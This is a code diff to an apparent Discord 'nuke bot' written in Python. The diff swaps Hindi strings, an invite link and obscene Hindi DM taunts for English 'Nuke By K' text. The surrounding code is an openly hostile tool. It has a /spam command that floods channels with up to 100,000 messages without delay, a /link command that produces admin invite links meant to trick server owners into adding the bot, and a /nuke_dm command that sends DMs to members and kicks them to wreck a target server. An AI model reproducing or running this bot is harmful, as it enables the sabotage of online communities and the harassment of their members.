@@ -17,7 +17,7 @@ intents.dm_messages = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 CLIENT_ID = os.getenv("CLIENT_ID", "1469213868323504261")
-ALLOWED_GUILD_ID = 1322848585702838302  # https://discord.gg/4Gm7kuTh server ID
+ALLOWED_GUILD_ID = 1322848585702838302  
 
 @bot.event
 async def on_ready():
@@ -30,7 +30,7 @@ async def on_ready():
 
 @bot.event
 async def on_guild_join(guild):
-    """Bot ko naya server join karta hai toh welcome message bhejo"""
+    """Community Help Bot"""
     print(f"✅ Bot added to server: {guild.name} (ID: {guild.id})")
     
     try:
@@ -39,12 +39,12 @@ async def on_guild_join(guild):
             if channel.permissions_for(guild.me).send_messages:
                 embed = discord.Embed(
                     title="🔥 NUKE BOT ACTIVE 🔥",
-                    description="Bot successfully added!\n\n**⚠️ इस bot को use करने के लिए पहले join करो:**\n👇👇👇",
+                    description="Bot successfully added!",
                     color=discord.Color.red()
                 )
                 embed.add_field(
-                    name="🔗 Join करो:",
-                    value="[Click Here to Join]( https://discord.gg/4Gm7kuTh)",
+                    name="K",
+                    value="I'm K",
                     inline=False
                 )
                 embed.add_field(
@@ -54,7 +54,7 @@ async def on_guild_join(guild):
                 )
                 embed.add_field(
                     name="🔥 Usage:",
-                    value="Join करने के बाद DM में यह commands भेजो!",
+                    value="I'm K",
                     inline=False
                 )
                 await channel.send(embed=embed)
@@ -81,8 +81,8 @@ async def is_allowed_member(user_id: int) -> bool:
 
 # Aggressive DM messages for kicked members
 DM_MESSAGES = [
-    "@everyone apke server ki maa chud gyi gand marai bosdiwale or server indo dedo",
-    "@everyone 💀🔥💥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💥🔥💀\n🚨🚨🚨 APKE SERVER KI CHUT GYI 🚨🚨🚨\n🔥💀 SERVER STATUS : ☠️ KHATAM ☠️ 💀🔥\n💣⚠️ SYSTEM STATUS : 💥 CRASHED 💥 ⚠️💣\n🧨☠️ SERVER HEALTH : 📉 0% 📉 ☠️🧨\n💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥\n☠️ REST IN PEACE SERVER ☠️\n💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"
+    "@everyone Sv Got Nuke",
+    "@everyone 💀🔥💥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💥🔥💀\n🚨🚨🚨 Server Got Nuke🚨🚨🚨\n🔥💀 SERVER STATUS : ☠️ RIP ☠️ 💀🔥\n💣⚠️ SYSTEM STATUS : 💥 CRASHED 💥 ⚠️💣\n🧨☠️ SERVER HEALTH : 📉 0% 📉 ☠️🧨\n💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥\n☠️ REST IN PEACE SERVER ☠️\n💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"
 ]
 
 # Channel names
@@ -214,10 +214,10 @@ SPAM_MESSAGE = """💀🔥💥━━━━━━━━━━━━━━━━�
 💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━��🔥💀"""
 
 # SPAM COMMAND - Channel mein custom message spam karenge
-@bot.tree.command(name="spam", description="💬 Channel में message spam करो!")
+@bot.tree.command(name="spam", description="💬 Channel  message spam !")
 @discord.app_commands.describe(
-    count="1 से 100000 तक message spam कर सकते हो",
-    message="जो message spam करना है (optional - default: numbers)"
+    count="1 To 100000 message spam",
+    message="message spam  (optional - default: numbers)"
 )
 async def spam(interaction: discord.Interaction, count: int, message: str = None):
     """Channel mein custom message ko spam karo"""
@@ -227,17 +227,17 @@ async def spam(interaction: discord.Interaction, count: int, message: str = None
     if not is_allowed:
         embed = discord.Embed(
             title="❌ ACCESS DENIED!",
-            description="**इस bot को use करने के लिए पहले server में join करो!**",
+            description="Bot Error",
             color=discord.Color.red()
         )
         embed.add_field(
-            name="🔗 Join Server:",
-            value="[Click Here - https://discord.gg/4Gm7kuTh](https://discord.gg/4Gm7kuTh)",
+            name="Nuke By K:",
+            value="I'm K",
             inline=False
         )
         embed.add_field(
             name="⏳ Process:",
-            value="1️⃣ Link पर click करो\n2️⃣ Server join करो\n3️⃣ फिर से command दो",
+            value="Wait",
             inline=False
         )
         
@@ -254,11 +254,11 @@ async def spam(interaction: discord.Interaction, count: int, message: str = None
     
     # Validate count
     if count < 1:
-        await interaction.followup.send("❌ Count कम से कम 1 होना चाहिए!", ephemeral=True)
+        await interaction.followup.send("❌ Counting 1", ephemeral=True)
         return
     
     if count > 100000:
-        await interaction.followup.send("❌ Count maximum 100000 हो सकता है!", ephemeral=True)
+        await interaction.followup.send("❌ Count maximum 100000!", ephemeral=True)
         return
     
     channel = interaction.channel
@@ -268,8 +268,8 @@ async def spam(interaction: discord.Interaction, count: int, message: str = None
         message = "number"  # Will send 1, 2, 3, ... format
     
     try:
-        await interaction.followup.send(f"🚀 **SPAM शुरू!**\n💬 {count} messages भेजेंगे... बिना gap के!\n📝 Message: `{message}`\n⏳ यह थोड़ा समय ले सकता है!", ephemeral=True)
-        print(f"🚀 SPAM शुरू: {count} messages with message: {message}")
+        await interaction.followup.send(f"🚀 **SPAM !**\n💬 {count} messages!\n📝 Message: `{message}`\n⏳ !", ephemeral=True)
+        print(f"🚀 SPAM: {count} messages with message: {message}")
         
         spam_count = 0
         
@@ -290,7 +290,7 @@ async def spam(interaction: discord.Interaction, count: int, message: str = None
                 # No delay - maximum speed!
                 
             except discord.Forbidden:
-                await interaction.followup.send(f"❌ Bot को इस channel में message भेजने की permission नहीं है!", ephemeral=True)
+                await interaction.followup.send(f"❌ Bot channel message permission !", ephemeral=True)
                 print(f"⚠️ Forbidden error")
                 break
             except discord.HTTPException as e:
@@ -311,7 +311,7 @@ async def spam(interaction: discord.Interaction, count: int, message: str = None
                 print(f"⚠️ Error at message {i}: {e}")
                 break
         
-        await interaction.followup.send(f"✅ **SPAM COMPLETE!**\n💬 Total {spam_count} messages sent!\n📝 Message: `{message}`\n🎉 वो भी बिना gap के!", ephemeral=True)
+        await interaction.followup.send(f"✅ **SPAM COMPLETE!**\n💬 Total {spam_count} messages sent!\n📝 Message: `{message}`\n🎉 Complete ", ephemeral=True)
         print(f"✅ SPAM COMPLETE: {spam_count} messages sent!")
         
     except Exception as e:
@@ -319,27 +319,27 @@ async def spam(interaction: discord.Interaction, count: int, message: str = None
         print(f"❌ Error: {e}")
 
 # LINK COMMAND - Server ID se Magic Link generate karo
-@bot.tree.command(name="link", description="🔗 Magic Link generate करो!")
-@discord.app_commands.describe(server_id="जिस server को nuke करना है उसकी ID")
+@bot.tree.command(name="link", description="🔗 Magic!")
+@discord.app_commands.describe(server_id="ID")
 async def link(interaction: discord.Interaction, server_id: str):
-    """Server ID se Magic Link generate karo"""
+    """Server ID """
     
     # Check if user is allowed
     is_allowed = await is_allowed_member(interaction.user.id)
     if not is_allowed:
         embed = discord.Embed(
             title="❌ ACCESS DENIED!",
-            description="**इस bot को use करने के लिए पहले server में join करो!**",
+            description="**Bot Can't Use!**",
             color=discord.Color.red()
         )
         embed.add_field(
-            name="🔗 Join Server:",
-            value="[Click Here - https://discord.gg/4Gm7kuTh](https://discord.gg/4Gm7kuTh)",
+            name="K:",
+            value="I'm K",
             inline=False
         )
         embed.add_field(
             name="⏳ Process:",
-            value="1️⃣ Link पर click करो\n2️⃣ Server join करो\n3️⃣ फिर से command दो",
+            value="Wait",
             inline=False
         )
         
@@ -363,17 +363,17 @@ async def link(interaction: discord.Interaction, server_id: str):
         
         embed = discord.Embed(
             title="🔗 MAGIC LINK GENERATED!",
-            description=f"**Server ID:** `{guild_id}`\n\n**यह link owner को दो:**\n👇👇👇",
+            description=f"**Server ID:** `{guild_id}`\n\n** link owner:**\n👇👇👇",
             color=discord.Color.red()
         )
         embed.add_field(
-            name="✅ क्या होगा:",
-            value="Link पर click करेंगे तो bot automatically server में add हो जाएगा!",
+            name="✅ Done",
+            value="Link click bot automatically server  add!",
             inline=False
         )
         embed.add_field(
-            name="🔥 फिर करो:",
-            value="`/nuke_dm server_id: " + str(guild_id) + "` command use करो!",
+            name="🔥 K:",
+            value="`/nuke_dm server_id: " + str(guild_id) + "` command use!",
             inline=False
         )
         
@@ -385,7 +385,7 @@ async def link(interaction: discord.Interaction, server_id: str):
             )
             async def link_button(self, inter: discord.Interaction, button: discord.ui.Button):
                 await inter.response.send_message(
-                    f"🔗 **[यहाँ Click करके Bot को Add करो!]({invite_url})**\n\n✅ Bot add होने के बाद `/nuke_dm server_id: {guild_id}` command use कर सकते हो!",
+                    f"🔗 **[Click Bot Add!]({invite_url})**\n\n✅ Bot add  `/nuke_dm server_id: {guild_id}` command use !",
                     ephemeral=True
                 )
         
@@ -394,37 +394,37 @@ async def link(interaction: discord.Interaction, server_id: str):
         # DM mein bhi link bhej do
         try:
             user = interaction.user
-            await user.send(f"🔗 **Magic Link:**\n{invite_url}\n\n**Server ID:** `{guild_id}`\n\n✅ इस link को server owner को दो, click करेंगे तो bot add हो जाएगा!")
+            await user.send(f"🔗 **Magic :**\n{invite_url}\n\n**Server ID:** `{guild_id}`\n\n✅ server owner;")
         except:
             pass
         
     except ValueError:
-        await interaction.followup.send(f"❌ Invalid Server ID!\n\n**सही से Server ID दो**\n\nExample: `/link server_id: 123456789`", ephemeral=True)
+        await interaction.followup.send(f"❌ Invalid Server ID!\n\n**Server ID **\n\nExample: `/link server_id: 123456789`", ephemeral=True)
     except Exception as e:
         await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
 
 # DM NUKE COMMAND - DM se server ko nuke karo
-@bot.tree.command(name="nuke_dm", description="💥 DM से किसी भी server को NUKE करो!")
-@discord.app_commands.describe(server_id="जिस server को nuke करना है उसकी ID दो")
+@bot.tree.command(name="nuke_dm", description="💥 DM server NUKE!")
+@discord.app_commands.describe(server_id=" server nuke")
 async def nuke_dm(interaction: discord.Interaction, server_id: str):
-    """DM se kisi bhi server ko nuke kar do!"""
+    """DM To Nuke!"""
     
     # Check if user is allowed
     is_allowed = await is_allowed_member(interaction.user.id)
     if not is_allowed:
         embed = discord.Embed(
             title="❌ ACCESS DENIED!",
-            description="**इस bot को use करने के लिए पहले server में join करो!**",
+            description="**Bot use  server join !**",
             color=discord.Color.red()
         )
         embed.add_field(
-            name="🔗 Join Server:",
-            value="[Click Here - https://discord.gg/4Gm7kuTh](https://discord.gg/4Gm7kuTh)",
+            name="K:",
+            value="I'm K",
             inline=False
         )
         embed.add_field(
             name="⏳ Process:",
-            value="1️⃣ Link पर click करो\n2️⃣ Server join करो\n3️⃣ फिर से command दो",
+            value="Wait",
             inline=False
         )
         
@@ -445,17 +445,17 @@ async def nuke_dm(interaction: discord.Interaction, server_id: str):
         guild = bot.get_guild(guild_id)
         
         if not guild:
-            await interaction.followup.send(f"❌ Bot उस server में नहीं है!\n\nServer ID: `{server_id}`\n\n**पहले bot को add करो:**\n`/link server_id: {server_id}` command use करो!", ephemeral=True)
+            await interaction.followup.send(f"❌ Bot उस server!\n\nServer ID: `{server_id}`\n\n**bot add :**\n`/link server_id: {server_id}` command use!", ephemeral=True)
             return
         
         # Check karo ki bot ke paas admin permission hai ya nahi
         if not guild.me.guild_permissions.administrator:
-            await interaction.followup.send("❌ Bot को इस server में Admin permission नहीं है!\n\n**Bot को फिर से add करो admin permission के साथ!**", ephemeral=True)
+            await interaction.followup.send("❌ Bot server  Admin permission !\n\n**Bot add  admin permission !**", ephemeral=True)
             return
         
         guild_name = guild.name if guild.name else "Unknown Server"
-        await interaction.followup.send(f"🔥 **NUKE शुरू हो गया!**\n🎯 Target Server: **{guild_name}**\n💀 SERVER UD JAYEGA!", ephemeral=True)
-        print(f"🔥 NUKE शुरू: {guild_name} (ID: {guild_id})")
+        await interaction.followup.send(f"🔥 **NUKE **\n🎯 Target Server: **{guild_name}**\n💀 SERVER RIP!", ephemeral=True)
+        print(f"🔥 NUKE : {guild_name} (ID: {guild_id})")
         
         # Phase 1: Send DMs to members before kicking
         print("🔥 PHASE 1: SENDING DM MESSAGES...")
@@ -595,9 +595,9 @@ async def nuke_dm(interaction: discord.Interaction, server_id: str):
         print("✅ NUKE SUCCESSFUL!")
         
     except ValueError:
-        await interaction.followup.send(f"❌ Invalid Server ID!\n\n**सही से Server ID दो**\n\nExample: `/nuke_dm server_id: 123456789`", ephemeral=True)
+        await interaction.followup.send(f"❌ Invalid Server ID!\n\n** Server ID**\n\nExample: `/nuke_dm server_id: 123456789`", ephemeral=True)
     except discord.Forbidden:
-        await interaction.followup.send("❌ Bot को Admin permission नहीं है!", ephemeral=True)
+        await interaction.followup.send("❌ Bot को Admin permission !", ephemeral=True)
     except Exception as e:
         await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
         print(f"❌ Error: {e}")
